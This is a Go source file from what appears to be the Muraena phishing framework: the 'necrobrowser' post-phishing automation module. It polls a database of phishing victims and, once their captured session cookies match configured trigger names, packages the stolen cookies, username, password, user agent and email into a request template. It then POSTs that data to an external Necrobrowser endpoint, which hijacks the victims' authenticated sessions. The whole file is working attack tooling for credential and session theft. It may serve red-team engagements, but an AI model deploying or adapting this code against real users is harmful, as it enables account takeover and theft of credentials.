package necrobrowser

import (
	"encoding/json"
	"io/ioutil"
	"strings"
	"time"

	"github.com/evilsocket/islazy/tui"
	"gopkg.in/resty.v1"

	"github.com/muraenateam/muraena/core/db"
	"github.com/muraenateam/muraena/session"
)

const (
	// Name of this module
	Name = "necrobrowser"

	// Description of this module
	Description = "Post-phishing automation via Necrobrowser-NG"

	// Author of this module
	Author = "Muraena Team"

	// Placeholders for templates
	TrackerPlaceholder     = "%%%TRACKER%%%"
	CookiePlaceholder      = "%%%COOKIES%%%"
	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
	UserAgentPlaceholder   = "%%%USERAGENT%%%"
	EmailPlaceholder       = "%%%EMAIL%%%"
)

// Necrobrowser module
type Necrobrowser struct {
	session.SessionModule

	Enabled  bool
	Endpoint string
	Profile  string

	RequestTemplate string
}

// SessionCookie structure
type SessionCookie struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Domain   string `json:"domain"`
	Expires  int64  `json:"expires"`
	Path     string `json:"path"`
	HTTPOnly bool   `json:"httpOnly"`
	Secure   bool   `json:"secure"`
	Session  bool   `json:"session"`
}

// VictimCredentials structure
type VictimCredentials struct {
	Key   string
	Value string
	Time  time.Time
}

// Name returns the module name
func (module *Necrobrowser) Name() string {
	return Name
}

// Description returns the module description
func (module *Necrobrowser) Description() string {
	return Description
}

// Author returns the module author
func (module *Necrobrowser) Author() string {
	return Author
}

// Prompt prints module status based on the provided parameters
func (module *Necrobrowser) Prompt() {
	module.Raw("No options are available for this module")
}

// Load configures the module by initializing its main structure and variables
func Load(s *session.Session) (m *Necrobrowser, err error) {

	m = &Necrobrowser{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.Necrobrowser.Enabled,
	}

	if !m.Enabled {
		m.Debug("is disabled")
		return
	}

	config := s.Config.Necrobrowser
	m.Endpoint = config.Endpoint

	m.Profile = config.Profile
	bytes, err := ioutil.ReadFile(m.Profile)
	if err != nil {
		m.Warning("Error reading profile file %s: %s", m.Profile, err)
		m.Enabled = false
		return
	}

	m.RequestTemplate = string(bytes)

	// spawn a go routine that checks all the victims cookie jars every N seconds
	// to see if we have any sessions ready to be instrumented
	if s.Config.Necrobrowser.Enabled {
		m.Info("enabled")
		go m.CheckSessions()

		m.Info("trigger delay every %d seconds", s.Config.Necrobrowser.Trigger.Delay)
	}

	return
}

func (module *Necrobrowser) CheckSessions() {
	triggerType := module.Session.Config.Necrobrowser.Trigger.Type
	triggerDelay := module.Session.Config.Necrobrowser.Trigger.Delay

	for {
		switch triggerType {
		case "cookies":
			module.CheckSessionCookies()
		case "path":
		default:
			module.Debug("use authSessionResponse as trigger")
		}

		module.Verbose("sleeping for %d seconds", triggerDelay)
		time.Sleep(time.Duration(triggerDelay) * time.Second)
	}
}

func (module *Necrobrowser) CheckSessionCookies() {
	triggerValues := module.Session.Config.Necrobrowser.Trigger.Values

	victims, err := db.GetAllVictims()
	if err != nil {
		module.Debug("error fetching all victims: %s", err)
	}

	for _, v := range victims {
		cookiesFound := 0
		cookiesNeeded := len(triggerValues)
		for _, cookie := range v.Cookies {
			if Contains(&triggerValues, cookie.Name) {
				cookiesFound++
			}
		}

		// if we find the cookies, and the session has not been already instrumented (== false), then instrument
		if cookiesNeeded == cookiesFound && !v.SessionInstrumented {
			// create Credential struct
			type Creds struct {
				Username string `json:"username"`
				Password string `json:"password"`
			}

			var ccreds = Creds{}
			for _, t := range v.Credentials {
				switch t.Key {
				case "Password":
					ccreds.Password = t.Value
				case "Username":
					ccreds.Username = t.Value
				}
			}

			j, err := json.Marshal(ccreds)
			if err != nil {
				module.Debug("error marshalling %s", err)
			}

			// prevent the session from being instrumented twice (set flag BEFORE calling Instrument)
			_ = db.SetSessionAsInstrumented(v.ID)

			module.Info("instrumenting %s using %d cookies", tui.Bold(tui.Red(v.ID)), cookiesFound)
			module.Instrument(v.ID, v.Cookies, string(j), v.UA)
		}
	}
}

func Contains(slice *[]string, find string) bool {
	for _, a := range *slice {
		if a == find {
			return true
		}
	}
	return false
}

func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCookie, credentialsJSON string, userAgent string) {
	var necroCookies []SessionCookie
	const timeLayout = "2006-01-02 15:04:05 -0700 MST"

	for _, c := range cookieJar {
		t, err := time.Parse(timeLayout, c.Expires)
		if err != nil {
			module.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
			continue
		}

		nc := SessionCookie{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain,
			Expires:  t.Unix(),
			Path:     c.Path,
			HTTPOnly: c.HTTPOnly,
			Secure:   c.Secure,
			Session:  false,
		}

		necroCookies = append(necroCookies, nc)
	}

	c, err := json.MarshalIndent(necroCookies, "", "\t")
	if err != nil {
		module.Warning("Error marshalling the cookies: %s", err)
		return
	}

	// Extract email from credentials JSON
	// Priority: "Email" first, then "Username" as fallback (case-insensitive)
	email := ""
	emailFields := []string{"email", "username"}

	var credsMap map[string]interface{}
	if err := json.Unmarshal([]byte(credentialsJSON), &credsMap); err == nil {
		// Format 1: {"email":"x","password":"y"} or {"username":"x","password":"y"}
		for _, target := range emailFields {
			for k, v := range credsMap {
				if strings.EqualFold(k, target) {
					if strVal, ok := v.(string); ok && strVal != "" {
						email = strVal
						break
					}
				}
			}
			if email != "" {
				break
			}
		}
	}
	// Format 2: [{"Key":"Email","Value":"x","Time":"..."}]
	// VictimCredential has no json tags, so Go marshals as Key/Value/Time (capitalized).
	// We also handle lowercase key/val for safety.
	if email == "" {
		var credsArr []map[string]interface{}
		if err := json.Unmarshal([]byte(credentialsJSON), &credsArr); err == nil {
			for _, target := range emailFields {
				for _, cred := range credsArr {
					// Find the credential key field (try Key, key)
					credKey := ""
					for k, v := range cred {
						if strings.EqualFold(k, "key") {
							if s, ok := v.(string); ok {
								credKey = s
								break
							}
						}
					}
					if !strings.EqualFold(credKey, target) {
						continue
					}
					// Find the credential value field (try Value, val, value)
					for k, v := range cred {
						if strings.EqualFold(k, "value") || strings.EqualFold(k, "val") {
							if s, ok := v.(string); ok && s != "" {
								email = s
								break
							}
						}
					}
					if email != "" {
						break
					}
				}
				if email != "" {
					break
				}
			}
		}
	}

	newRequest := module.RequestTemplate
	newRequest = strings.ReplaceAll(newRequest, TrackerPlaceholder, victimID)
	newRequest = strings.ReplaceAll(newRequest, CookiePlaceholder, string(c))
	newRequest = strings.ReplaceAll(newRequest, CredentialsPlaceholder, credentialsJSON)
	newRequest = strings.ReplaceAll(newRequest, UserAgentPlaceholder, userAgent)
	newRequest = strings.ReplaceAll(newRequest, EmailPlaceholder, email)

	module.Info("instrumenting %s", tui.Bold(tui.Red(victimID)))
	client := resty.New()
	resp, err := client.R().
		SetHeader("Content-Type", "application/json").
		SetBody(newRequest).
		Post(module.Endpoint)

	if err != nil {
		module.Warning("Error sending request to Necrobrowser: %s", err)
		return
	}

	module.Info("instrumenting-response %s:\n%v", tui.Bold(tui.Red(victimID)), tui.Bold(tui.Green(resp.String())))
	return
}
